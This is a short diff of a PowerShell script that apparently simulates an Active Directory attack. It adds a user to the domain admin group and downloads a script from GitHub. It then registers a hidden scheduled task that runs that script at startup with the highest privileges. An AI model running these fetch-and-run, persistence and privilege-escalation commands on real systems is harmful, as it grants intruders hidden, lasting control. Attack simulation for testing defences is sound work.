@@ -10,7 +10,7 @@ Add-ADGroupMember -Identity $domainAdminGroup -Members $userName
 $scriptPath = "C:\demo\follow.ps1"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/natashell666/DemoScripts/main/ADSimulAttack/follow.ps1" -OutFile $scriptPath
 
-$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`" -username `"$userName`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
 $principal = New-ScheduledTaskPrincipal -UserId "$userName" -LogonType S4U -RunLevel Highest
